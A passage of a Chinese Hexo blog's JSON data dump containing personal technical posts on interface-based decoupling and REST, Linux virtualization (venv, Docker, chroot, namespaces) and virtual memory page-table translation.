class=\"code\"><pre><span class=\"line\">interface Car&#123;</span><br><span class=\"line\">  public void Run(Wheel wheel);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>同时，轮子类也做个接口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">interface Wheel&#123;</span><br><span class=\"line\">  public void go();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>之后，实现车类。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public BMW_Car implement Car&#123;</span><br><span class=\"line\">  Wheel wheel;</span><br><span class=\"line\">  public void BMW_Car(Wheel wheel)&#123;</span><br><span class=\"line\">      this.wheel &#x3D; wheel;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  public void Run()&#123;</span><br><span class=\"line\">    this.wheel.go();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public Tesla implements Car&#123;</span><br><span class=\"line\">  Wheel wheel;</span><br><span class=\"line\"></span><br><span class=\"line\">  public void Tesla(Wheel wheel)&#123;</span><br><span class=\"line\">    this.wheel &#x3D; wheel;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  public void Run()&#123;</span><br><span class=\"line\">    this.wheel.go();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过接口，轮子类和车轮之间的耦合度降低了。在上面，我不再关心这辆宝马车用的是什么轮子。我要的只是轮子，你只要满足轮子接口的东西就可以了。</p>\n<p>你完全可以写成下面的代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Person&#123;</span><br><span class=\"line\">  public void driving()&#123;</span><br><span class=\"line\">      Car BMW_Car &#x3D; new BMW_Car()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>（为什么不用万能的 Python 来写这段代码？那是因为 Python 是鸭子类型啊，不需要接口）</p>\n<h3 id=\"REST-风格\"><a href=\"#REST-风格\" class=\"headerlink\" title=\"REST 风格\"></a>REST 风格</h3><p>解决依赖的方法除了在代码上，我们还可以通过使用更成熟的思想。</p>\n<p>在 2000 年，Fielding 大佬的博士论文的第五章，介绍了一种架构风格，叫作 REST（Representation state transfer）。这种风格，如今应用于各大应用中。</p>\n<p>简单来说，客户端与服务器交流时，每次请求都与上一次无关。换而言之，每一次请求都不依赖于上一次请求。这样，我们将耦合降到了最低。当我需要资源时，只需要向服务器请求，我只知道向哪一个 URL 请求，根本无需知道我所请求的是分布式系统中的具体的哪一个，因为每一次请求对它们而言，都是崭新的。这样，不需要担心可拓展性。</p>\n<p>同时，RESTful 带来的好处还有：改善了可见性。由于每一次请求得到的数据都不应该超过一次请求所得到的数据，因此数据的完整性得到了保证。同时，提升了可靠性。如果请求出了问题，我们也只需要恢复一次请求便可以了。</p>\n<p>通过这一风格设计出来的接口，在通用性上会大大增强。</p>\n<h3 id=\"MASHUP-应用\"><a href=\"#MASHUP-应用\" class=\"headerlink\" title=\"MASHUP 应用\"></a>MASHUP 应用</h3><p>当接口设计得足够多，与之而来的，应用上的发展也开始了。</p>\n<p>mashup 最早起源于音乐界，将不同的音乐混合在一起的演出方式。在如今的 IT 界中，它表示一种应用做法：组合不同的 WEB 服务，合成一个应用。</p>\n<p>举个例子。 2018年，GOOGLE 公开了 GOOGLE MAP 的数据接口。因此，每个人都可以用它，和其它服务，比如天气服务接口，做出一个新的应用，在地图上显示每个城市的天气，或者做更有趣的，比如抄袭 Pokemon GO，做个捉妖怪的游戏。</p>\n<p>mashup 的组成分成三部分。一部分是服务提供商(者)，一部分是 mashup 站点，一部分是客户端。这三者每一部分都是可替代，我可以用不同服务商提供的 api，这个应用也可是另一个人来做，至于服务端，大多数是基于浏览器，你换成哪一个浏览器都可以。于是，mashup 属于松散耦合，可以说，是利用接口最好的诠释。</p>\n<hr>\n<p>又说了一大堆无用的东西。</p>"},{"title":"对于虚拟化的执着","date":"2019-08-10T16:00:00.000Z","_content":"我第一次了解到虚拟化，是在用 VM Ware 时。\n\n<!-- more -->\n\n虚拟化给人的感觉真的很棒。将真实与实验分割开来，互不影响，即使出了问题，删掉再开就是了。在虚拟机里发生的事情，丝毫不影响主机，这种感觉真的有种玩游戏/做梦的错觉。但总觉得 VM 还是太大了，开起来之后，整个电脑都卡成 PPT 了。\n\n后来用 Python 做一些小服务时，发现 Python3 自带虚拟化。通过\n\n```\npython3 -m venv vitual_name \n```\n\n就可以建立一个小的虚拟环境。在这个小环境里，新装的所有第三方库，都不会影响到主机现有的库。这样一来，python 依敕也就可以随便玩了。如果依敕出了问题，比如版本号不对，新的版本不兼容旧的代码等，也不至于所有的脚本都影响到。删了就好了。\n\n再后来发现了 Docker。Docker 比起虚拟机，轻量得多。在上面建立好服务后，便可以上传。到了另一台服务器上，下载便可以使用，不用再装各种依赖，解决各种各样的麻烦。就如它的名字一样，依赖被关在 Docker 里。当需要时，打开 docker，所有的东西都在里面。这在开发时简直是利器啊！我只要在本地做好一个版本，工作就完全结束了，剩下服务器端只要下载，运行，就OK了。\n\n同时，我也要好奇。虚拟化那麽厉害的东西，究竟是怎麽完成的？\n\n仔细想想，虚拟化并不是什麽新奇的东西。我们的每一个进程，从某种角度上看，就是虚拟化的产物。\n\n在早期计算机的发展中，内存是很稀缺的一种东西。比如有些电脑就 4k bytes。这种情况下，光是加载程序文本就很困难。于是虚拟内存、页表等孕育而生。它们让每一个进程觉得，自己独佔了机器，随意使用计算机里的内存。通过 CPU 调度，让每一个进程都有一定的活动时间。从人的角度上看，有多个进程在运行，而进程本身，它们只看到了自己。\n\n从这个角度上看，每一个进程都与主机上的其它程序无关，它们彼此隔开，就好像一台台虚拟机。\n\n不过，改变了世界的 Linux 给我们带来了更美妙的东西。\n\n在 Linux 里，有趣的命令很多，其中的一条就和我今天想讨论的东西有关。它就是 chroot。\n\nchroot 是一个可以欺骗命令的命令。它可以让任何命令，认爲当前的目录就是根目录。\n\n```bash\n# chroot /path/to/new/root command\n```\n\nLinux 中，绝大部分命令、程序，都以根目录 「/」 爲中心。如果能欺骗命令，让其认定新的根目录，不就好像实现了虚拟化了吗？\n\n比如下面这一个有趣的实验。它建立了一个只能使用 ls 命令的监狱(jali)。方法也很简单，只将跟 ls 有关的依赖放在新目录里，再 chroot bash 命令。\n\n![建立监狱的过程](1565527230467.gif)\n\n但这并不够。chroot 只能使用在文件系统上。对于网络，IO等，它无法限制。\n\n于是，内核 3.8 中，诞生的 namespace（命名空间）打破了这一限制。namespace 也是一种虚拟化方式，但它可以做到更多。它支持以下几种 namespace。\n\n- uts_namespace\n- ipc_namespace\n- mnt_namespace\n- pid_namespace\n- user_namespace\n- net\n\n在进程的虚拟化上，使用 fork 或 clone 就可以创建一个新的命名空间。进程与命名空间之间，借助 nsproxy 进行代理。\n\n从 nsproxy 的结构上，也可以看到上面的几种命名空间。\n\n```\nstruct nsproxy{\n    atomic_t count;\n    struct uts_namespace *uts_ns;\n    struct ipc_namespace *ipc_ns;\n    struct mnt_namespace *mnt_ns;\n    struct pid_namespace *pid_ns;\n    struct net *net_ns;\n}\n```\n\n除开第一行，剩下都是命名空间的结构。\n\n命名空间的出现，才有了如今的 docker。\n\n对于虚拟化越发的着迷，我对计算机就越发的执着。\n\n想来想去，之所以会着迷于虚拟化，可能是因爲从小搞坏了不少电脑的原故吧？\n","source":"_posts/对于虚拟化的执着.md","raw":"---\ntitle: 对于虚拟化的执着\ndate: 2019-08-11\ntags:\n---\n我第一次了解到虚拟化，是在用 VM Ware 时。\n\n<!-- more -->\n\n虚拟化给人的感觉真的很棒。将真实与实验分割开来，互不影响，即使出了问题，删掉再开就是了。在虚拟机里发生的事情，丝毫不影响主机，这种感觉真的有种玩游戏/做梦的错觉。但总觉得 VM 还是太大了，开起来之后，整个电脑都卡成 PPT 了。\n\n后来用 Python 做一些小服务时，发现 Python3 自带虚拟化。通过\n\n```\npython3 -m venv vitual_name \n```\n\n就可以建立一个小的虚拟环境。在这个小环境里，新装的所有第三方库，都不会影响到主机现有的库。这样一来，python 依敕也就可以随便玩了。如果依敕出了问题，比如版本号不对，新的版本不兼容旧的代码等，也不至于所有的脚本都影响到。删了就好了。\n\n再后来发现了 Docker。Docker 比起虚拟机，轻量得多。在上面建立好服务后，便可以上传。到了另一台服务器上，下载便可以使用，不用再装各种依赖，解决各种各样的麻烦。就如它的名字一样，依赖被关在 Docker 里。当需要时，打开 docker，所有的东西都在里面。这在开发时简直是利器啊！我只要在本地做好一个版本，工作就完全结束了，剩下服务器端只要下载，运行，就OK了。\n\n同时，我也要好奇。虚拟化那麽厉害的东西，究竟是怎麽完成的？\n\n仔细想想，虚拟化并不是什麽新奇的东西。我们的每一个进程，从某种角度上看，就是虚拟化的产物。\n\n在早期计算机的发展中，内存是很稀缺的一种东西。比如有些电脑就 4k bytes。这种情况下，光是加载程序文本就很困难。于是虚拟内存、页表等孕育而生。它们让每一个进程觉得，自己独佔了机器，随意使用计算机里的内存。通过 CPU 调度，让每一个进程都有一定的活动时间。从人的角度上看，有多个进程在运行，而进程本身，它们只看到了自己。\n\n从这个角度上看，每一个进程都与主机上的其它程序无关，它们彼此隔开，就好像一台台虚拟机。\n\n不过，改变了世界的 Linux 给我们带来了更美妙的东西。\n\n在 Linux 里，有趣的命令很多，其中的一条就和我今天想讨论的东西有关。它就是 chroot。\n\nchroot 是一个可以欺骗命令的命令。它可以让任何命令，认爲当前的目录就是根目录。\n\n```bash\n# chroot /path/to/new/root command\n```\n\nLinux 中，绝大部分命令、程序，都以根目录 「/」 爲中心。如果能欺骗命令，让其认定新的根目录，不就好像实现了虚拟化了吗？\n\n比如下面这一个有趣的实验。它建立了一个只能使用 ls 命令的监狱(jali)。方法也很简单，只将跟 ls 有关的依赖放在新目录里，再 chroot bash 命令。\n\n![建立监狱的过程](1565527230467.gif)\n\n但这并不够。chroot 只能使用在文件系统上。对于网络，IO等，它无法限制。\n\n于是，内核 3.8 中，诞生的 namespace（命名空间）打破了这一限制。namespace 也是一种虚拟化方式，但它可以做到更多。它支持以下几种 namespace。\n\n- uts_namespace\n- ipc_namespace\n- mnt_namespace\n- pid_namespace\n- user_namespace\n- net\n\n在进程的虚拟化上，使用 fork 或 clone 就可以创建一个新的命名空间。进程与命名空间之间，借助 nsproxy 进行代理。\n\n从 nsproxy 的结构上，也可以看到上面的几种命名空间。\n\n```\nstruct nsproxy{\n    atomic_t count;\n    struct uts_namespace *uts_ns;\n    struct ipc_namespace *ipc_ns;\n    struct mnt_namespace *mnt_ns;\n    struct pid_namespace *pid_ns;\n    struct net *net_ns;\n}\n```\n\n除开第一行，剩下都是命名空间的结构。\n\n命名空间的出现，才有了如今的 docker。\n\n对于虚拟化越发的着迷，我对计算机就越发的执着。\n\n想来想去，之所以会着迷于虚拟化，可能是因爲从小搞坏了不少电脑的原故吧？\n","slug":"对于虚拟化的执着","published":1,"updated":"2020-03-07T08:01:31.328Z","_id":"ck7h7gcp50003633x4f3ehvat","comments":1,"layout":"post","photos":[],"link":"","content":"<p>我第一次了解到虚拟化，是在用 VM Ware 时。</p>\n<a id=\"more\"></a>\n\n<p>虚拟化给人的感觉真的很棒。将真实与实验分割开来，互不影响，即使出了问题，删掉再开就是了。在虚拟机里发生的事情，丝毫不影响主机，这种感觉真的有种玩游戏/做梦的错觉。但总觉得 VM 还是太大了，开起来之后，整个电脑都卡成 PPT 了。</p>\n<p>后来用 Python 做一些小服务时，发现 Python3 自带虚拟化。通过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m venv vitual_name</span><br></pre></td></tr></table></figure>\n\n<p>就可以建立一个小的虚拟环境。在这个小环境里，新装的所有第三方库，都不会影响到主机现有的库。这样一来，python 依敕也就可以随便玩了。如果依敕出了问题，比如版本号不对，新的版本不兼容旧的代码等，也不至于所有的脚本都影响到。删了就好了。</p>\n<p>再后来发现了 Docker。Docker 比起虚拟机，轻量得多。在上面建立好服务后，便可以上传。到了另一台服务器上，下载便可以使用，不用再装各种依赖，解决各种各样的麻烦。就如它的名字一样，依赖被关在 Docker 里。当需要时，打开 docker，所有的东西都在里面。这在开发时简直是利器啊！我只要在本地做好一个版本，工作就完全结束了，剩下服务器端只要下载，运行，就OK了。</p>\n<p>同时，我也要好奇。虚拟化那麽厉害的东西，究竟是怎麽完成的？</p>\n<p>仔细想想，虚拟化并不是什麽新奇的东西。我们的每一个进程，从某种角度上看，就是虚拟化的产物。</p>\n<p>在早期计算机的发展中，内存是很稀缺的一种东西。比如有些电脑就 4k bytes。这种情况下，光是加载程序文本就很困难。于是虚拟内存、页表等孕育而生。它们让每一个进程觉得，自己独佔了机器，随意使用计算机里的内存。通过 CPU 调度，让每一个进程都有一定的活动时间。从人的角度上看，有多个进程在运行，而进程本身，它们只看到了自己。</p>\n<p>从这个角度上看，每一个进程都与主机上的其它程序无关，它们彼此隔开，就好像一台台虚拟机。</p>\n<p>不过，改变了世界的 Linux 给我们带来了更美妙的东西。</p>\n<p>在 Linux 里，有趣的命令很多，其中的一条就和我今天想讨论的东西有关。它就是 chroot。</p>\n<p>chroot 是一个可以欺骗命令的命令。它可以让任何命令，认爲当前的目录就是根目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># chroot /path/to/new/root command</span></span><br></pre></td></tr></table></figure>\n\n<p>Linux 中，绝大部分命令、程序，都以根目录 「/」 爲中心。如果能欺骗命令，让其认定新的根目录，不就好像实现了虚拟化了吗？</p>\n<p>比如下面这一个有趣的实验。它建立了一个只能使用 ls 命令的监狱(jali)。方法也很简单，只将跟 ls 有关的依赖放在新目录里，再 chroot bash 命令。</p>\n<p><img src=\"1565527230467.gif\" alt=\"建立监狱的过程\"></p>\n<p>但这并不够。chroot 只能使用在文件系统上。对于网络，IO等，它无法限制。</p>\n<p>于是，内核 3.8 中，诞生的 namespace（命名空间）打破了这一限制。namespace 也是一种虚拟化方式，但它可以做到更多。它支持以下几种 namespace。</p>\n<ul>\n<li>uts_namespace</li>\n<li>ipc_namespace</li>\n<li>mnt_namespace</li>\n<li>pid_namespace</li>\n<li>user_namespace</li>\n<li>net</li>\n</ul>\n<p>在进程的虚拟化上，使用 fork 或 clone 就可以创建一个新的命名空间。进程与命名空间之间，借助 nsproxy 进行代理。</p>\n<p>从 nsproxy 的结构上，也可以看到上面的几种命名空间。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct nsproxy&#123;</span><br><span class=\"line\">    atomic_t count;</span><br><span class=\"line\">    struct uts_namespace *uts_ns;</span><br><span class=\"line\">    struct ipc_namespace *ipc_ns;</span><br><span class=\"line\">    struct mnt_namespace *mnt_ns;</span><br><span class=\"line\">    struct pid_namespace *pid_ns;</span><br><span class=\"line\">    struct net *net_ns;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>除开第一行，剩下都是命名空间的结构。</p>\n<p>命名空间的出现，才有了如今的 docker。</p>\n<p>对于虚拟化越发的着迷，我对计算机就越发的执着。</p>\n<p>想来想去，之所以会着迷于虚拟化，可能是因爲从小搞坏了不少电脑的原故吧？</p>\n","site":{"data":{}},"excerpt":"<p>我第一次了解到虚拟化，是在用 VM Ware 时。</p>","more":"<p>虚拟化给人的感觉真的很棒。将真实与实验分割开来，互不影响，即使出了问题，删掉再开就是了。在虚拟机里发生的事情，丝毫不影响主机，这种感觉真的有种玩游戏/做梦的错觉。但总觉得 VM 还是太大了，开起来之后，整个电脑都卡成 PPT 了。</p>\n<p>后来用 Python 做一些小服务时，发现 Python3 自带虚拟化。通过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m venv vitual_name</span><br></pre></td></tr></table></figure>\n\n<p>就可以建立一个小的虚拟环境。在这个小环境里，新装的所有第三方库，都不会影响到主机现有的库。这样一来，python 依敕也就可以随便玩了。如果依敕出了问题，比如版本号不对，新的版本不兼容旧的代码等，也不至于所有的脚本都影响到。删了就好了。</p>\n<p>再后来发现了 Docker。Docker 比起虚拟机，轻量得多。在上面建立好服务后，便可以上传。到了另一台服务器上，下载便可以使用，不用再装各种依赖，解决各种各样的麻烦。就如它的名字一样，依赖被关在 Docker 里。当需要时，打开 docker，所有的东西都在里面。这在开发时简直是利器啊！我只要在本地做好一个版本，工作就完全结束了，剩下服务器端只要下载，运行，就OK了。</p>\n<p>同时，我也要好奇。虚拟化那麽厉害的东西，究竟是怎麽完成的？</p>\n<p>仔细想想，虚拟化并不是什麽新奇的东西。我们的每一个进程，从某种角度上看，就是虚拟化的产物。</p>\n<p>在早期计算机的发展中，内存是很稀缺的一种东西。比如有些电脑就 4k bytes。这种情况下，光是加载程序文本就很困难。于是虚拟内存、页表等孕育而生。它们让每一个进程觉得，自己独佔了机器，随意使用计算机里的内存。通过 CPU 调度，让每一个进程都有一定的活动时间。从人的角度上看，有多个进程在运行，而进程本身，它们只看到了自己。</p>\n<p>从这个角度上看，每一个进程都与主机上的其它程序无关，它们彼此隔开，就好像一台台虚拟机。</p>\n<p>不过，改变了世界的 Linux 给我们带来了更美妙的东西。</p>\n<p>在 Linux 里，有趣的命令很多，其中的一条就和我今天想讨论的东西有关。它就是 chroot。</p>\n<p>chroot 是一个可以欺骗命令的命令。它可以让任何命令，认爲当前的目录就是根目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># chroot /path/to/new/root command</span></span><br></pre></td></tr></table></figure>\n\n<p>Linux 中，绝大部分命令、程序，都以根目录 「/」 爲中心。如果能欺骗命令，让其认定新的根目录，不就好像实现了虚拟化了吗？</p>\n<p>比如下面这一个有趣的实验。它建立了一个只能使用 ls 命令的监狱(jali)。方法也很简单，只将跟 ls 有关的依赖放在新目录里，再 chroot bash 命令。</p>\n<p><img src=\"1565527230467.gif\" alt=\"建立监狱的过程\"></p>\n<p>但这并不够。chroot 只能使用在文件系统上。对于网络，IO等，它无法限制。</p>\n<p>于是，内核 3.8 中，诞生的 namespace（命名空间）打破了这一限制。namespace 也是一种虚拟化方式，但它可以做到更多。它支持以下几种 namespace。</p>\n<ul>\n<li>uts_namespace</li>\n<li>ipc_namespace</li>\n<li>mnt_namespace</li>\n<li>pid_namespace</li>\n<li>user_namespace</li>\n<li>net</li>\n</ul>\n<p>在进程的虚拟化上，使用 fork 或 clone 就可以创建一个新的命名空间。进程与命名空间之间，借助 nsproxy 进行代理。</p>\n<p>从 nsproxy 的结构上，也可以看到上面的几种命名空间。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct nsproxy&#123;</span><br><span class=\"line\">    atomic_t count;</span><br><span class=\"line\">    struct uts_namespace *uts_ns;</span><br><span class=\"line\">    struct ipc_namespace *ipc_ns;</span><br><span class=\"line\">    struct mnt_namespace *mnt_ns;</span><br><span class=\"line\">    struct pid_namespace *pid_ns;</span><br><span class=\"line\">    struct net *net_ns;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>除开第一行，剩下都是命名空间的结构。</p>\n<p>命名空间的出现，才有了如今的 docker。</p>\n<p>对于虚拟化越发的着迷，我对计算机就越发的执着。</p>\n<p>想来想去，之所以会着迷于虚拟化，可能是因爲从小搞坏了不少电脑的原故吧？</p>"},{"title":"虚拟内存","date":"2019-08-16T16:00:00.000Z","_content":"## 没有虚拟内存带来的问题\n\n我们在运行程序时，总希望内存越大越好，这样可以运行的程序也可以越来越多，越来越大。但现实是，这样做是有很多成本的。最简单的成本就是钱。过去，爲了解决这个问题，人们写程序时，会考虑到内存大小，如果自己写的程序大过内存，那麽还要做一些工作，比如：想办法，只加载一部分代码，当有更多的需要时，再加载更多。\n\n<!-- more -->\n\n这是一个相当有开创性的想法。这一想法在后来诞生了虚拟内存的伟大概念。（我瞎掰的）\n\n## 虚拟内存的基本原理\n\n![](1566035265964.png)\n\n简单来说，当我们运行一个进程时，计算机并不会把整个程序都加载进内存里，而是放在硬盘上，当有需要时，再将加载需要的那一部分。\n\n那我们怎麽知道要加载哪一部分？比如说，我的下一条指令是到要变量 B，可是变量 B 没加载进内存，我也不知道它在哪，要怎麽去硬盘里找？\n\n那好吧，爲了做好映射关係，我们还要在进程运行时，给进程一张表，它负责进行内存和硬盘之间的关係。比如说，变量 B 的内存是 Ox11011，发现这在内存里不存在，那麽我们就去表上找，发现它在对应着内存里的 Ox00100，那麽我们就把内存里的那个 B 给它。\n\n但如果每一个变量，每个字都做映射，都要到硬盘里找，这实在是太麻类了。更重要的是，对硬盘做一次查询，所消耗的时间太长了，在 CPU 看来，每进行一次，都要花费 10 个月的时间。爲了省时省力，我们把程序分成多个部分，每一部分叫做一个虚拟页。同时，内存里也分成多个页，叫物理页。每一个物理页都可以容纳一个虚拟页。而映射它们的那张表，叫页表。\n\n现在我们来看看一个实例，虚拟地址是如何转换成物理地址的。\n\n一般而言，计算机是通过多级页表进行转换的，但爲了简单，这里就讨论只有一张页表的情况。\n\n现在设有 14 位的虚拟地址，要转换成 12 位的真实地址。其中，页表大小爲 64(2的6次方) B。\n\n1. 通过虚拟地址位数和页大小，我们可以换算得到，共有 21426=256\\cfrac{2^{14}}{2^6}=25626214​=256 项。也就是说，要 8 位数才能表示完所有页(VPN)。那麽 14−8=614-8=614−8=6 来表示偏移量(VPO)。\n\n2. 由虚拟地址的偏移量，我们可以知道真实地址的偏移量。（两者相等）\n\n比如下面，我们已知虚拟地址爲 00101100100010 （VPN(8) VPO(6)）\n\n那麽 00101100 爲虚拟页的首地址（页码）。100010 爲虚拟地址的偏移量。\n\n通过查页表，将 00101100 映射爲真实地址，假设爲 11010011，再加上偏移量 100010 得到真实地址 11010011100010.\n\n> 00101100100010 => 11010011100010\n\n到这里，地址转换就完成了！\n\n如果是多级页表，也只是通过多个 虚拟首地址（页码） 的转换而已。变成 VPN VPN VPN VPN ... VPO。\n\n## 它带来的好处\n\n简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）\n\n虚拟内存的出现，给我们带来了意想不到的好处。\n\n首先，它简化了链接过程。当程序编译完成时，程序里的每一个变量，每一个函数，还只是对应一个相对的地址，想要执行，还得有一个动态链接过程。由于虚拟页的存在，生成的可执行文件的地址可以独立于物理内存，这样设计链接器时，就简单得多。\n\n另外，因爲虚拟页与物理页之间是靠页表进行映射的，因此，一个进程的不周数据在物理内存里，可以不连续。毕竟查表就能知道它们的位置了，连不连续已经不重要了。于是，这样内存可以更动态，更轻鬆的进行分配。\n\n最后，可以虚拟化进程了。进程因爲页表的存在，不会存在相互干扰了。两个进程因爲页表与页表之间不同，映射到的地方不同，那怕虚拟地址相同，物理内存上也不会相同，它们之间彷彿有一道牆，阻止它们相互侵犯。\n\n## 虚拟化\n\n没错，地址也可以虚拟化。还有多少东西可以虚拟化呢？真的好期待啊。\n","source":"_posts/虚拟内存.md","raw":"---\ntitle: 虚拟内存\ndate: 2019-08-17\ntags:\n---\n## 没有虚拟内存带来的问题\n\n我们在运行程序时，总希望内存越大越好，这样可以运行的程序也可以越来越多，越来越大。但现实是，这样做是有很多成本的。最简单的成本就是钱。过去，爲了解决这个问题，人们写程序时，会考虑到内存大小，如果自己写的程序大过内存，那麽还要做一些工作，比如：想办法，只加载一部分代码，当有更多的需要时，再加载更多。\n\n<!-- more -->\n\n这是一个相当有开创性的想法。这一想法在后来诞生了虚拟内存的伟大概念。（我瞎掰的）\n\n## 虚拟内存的基本原理\n\n![](1566035265964.png)\n\n简单来说，当我们运行一个进程时，计算机并不会把整个程序都加载进内存里，而是放在硬盘上，当有需要时，再将加载需要的那一部分。\n\n那我们怎麽知道要加载哪一部分？比如说，我的下一条指令是到要变量 B，可是变量 B 没加载进内存，我也不知道它在哪，要怎麽去硬盘里找？\n\n那好吧，爲了做好映射关係，我们还要在进程运行时，给进程一张表，它负责进行内存和硬盘之间的关係。比如说，变量 B 的内存是 Ox11011，发现这在内存里不存在，那麽我们就去表上找，发现它在对应着内存里的 Ox00100，那麽我们就把内存里的那个 B 给它。\n\n但如果每一个变量，每个字都做映射，都要到硬盘里找，这实在是太麻类了。更重要的是，对硬盘做一次查询，所消耗的时间太长了，在 CPU 看来，每进行一次，都要花费 10 个月的时间。爲了省时省力，我们把程序分成多个部分，每一部分叫做一个虚拟页。同时，内存里也分成多个页，叫物理页。每一个物理页都可以容纳一个虚拟页。而映射它们的那张表，叫页表。\n\n现在我们来看看一个实例，虚拟地址是如何转换成物理地址的。\n\n一般而言，计算机是通过多级页表进行转换的，但爲了简单，这里就讨论只有一张页表的情况。\n\n现在设有 14 位的虚拟地址，要转换成 12 位的真实地址。其中，页表大小爲 64(2的6次方) B。\n\n1. 通过虚拟地址位数和页大小，我们可以换算得到，共有 21426=256\\cfrac{2^{14}}{2^6}=25626214​=256 项。也就是说，要 8 位数才能表示完所有页(VPN)。那麽 14−8=614-8=614−8=6 来表示偏移量(VPO)。\n\n2. 由虚拟地址的偏移量，我们可以知道真实地址的偏移量。（两者相等）\n\n比如下面，我们已知虚拟地址爲 00101100100010 （VPN(8) VPO(6)）\n\n那麽 00101100 爲虚拟页的首地址（页码）。100010 爲虚拟地址的偏移量。\n\n通过查页表，将 00101100 映射爲真实地址，假设爲 11010011，再加上偏移量 100010 得到真实地址 11010011100010.\n\n> 00101100100010 => 11010011100010\n\n到这里，地址转换就完成了！\n\n如果是多级页表，也只是通过多个 虚拟首地址（页码） 的转换而已。变成 VPN VPN VPN VPN ... VPO。\n\n## 它带来的好处\n\n简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）\n\n虚拟内存的出现，给我们带来了意想不到的好处。\n\n首先，它简化了链接过程。当程序编译完成时，程序里的每一个变量，每一个函数，还只是对应一个相对的地址，想要执行，还得有一个动态链接过程。由于虚拟页的存在，生成的可执行文件的地址可以独立于物理内存，这样设计链接器时，就简单得多。\n\n另外，因爲虚拟页与物理页之间是靠页表进行映射的，因此，一个进程的不周数据在物理内存里，可以不连续。毕竟查表就能知道它们的位置了，连不连续已经不重要了。于是，这样内存可以更动态，更轻鬆的进行分配。\n\n最后，可以虚拟化进程了。进程因爲页表的存在，不会存在相互干扰了。两个进程因爲页表与页表之间不同，映射到的地方不同，那怕虚拟地址相同，物理内存上也不会相同，它们之间彷彿有一道牆，阻止它们相互侵犯。\n\n## 虚拟化\n\n没错，地址也可以虚拟化。还有多少东西可以虚拟化呢？真的好期待啊。\n","slug":"虚拟内存","published":1,"updated":"2020-03-07T08:09:33.958Z","_id":"ck7h7k1df0004633x0a98blt0","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"没有虚拟内存带来的问题\"><a href=\"#没有虚拟内存带来的问题\" class=\"headerlink\" title=\"没有虚拟内存带来的问题\"></a>没有虚拟内存带来的问题</h2><p>我们在运行程序时，总希望内存越大越好，这样可以运行的程序也可以越来越多，越来越大。但现实是，这样做是有很多成本的。最简单的成本就是钱。过去，爲了解决这个问题，人们写程序时，会考虑到内存大小，如果自己写的程序大过内存，那麽还要做一些工作，比如：想办法，只加载一部分代码，当有更多的需要时，再加载更多。</p>\n<a id=\"more\"></a>\n\n<p>这是一个相当有开创性的想法。这一想法在后来诞生了虚拟内存的伟大概念。（我瞎掰的）</p>\n<h2 id=\"虚拟内存的基本原理\"><a href=\"#虚拟内存的基本原理\" class=\"headerlink\" title=\"虚拟内存的基本原理\"></a>虚拟内存的基本原理</h2><p><img src=\"1566035265964.png\" alt=\"\"></p>\n<p>简单来说，当我们运行一个进程时，计算机并不会把整个程序都加载进内存里，而是放在硬盘上，当有需要时，再将加载需要的那一部分。</p>\n<p>那我们怎麽知道要加载哪一部分？比如说，我的下一条指令是到要变量 B，可是变量 B 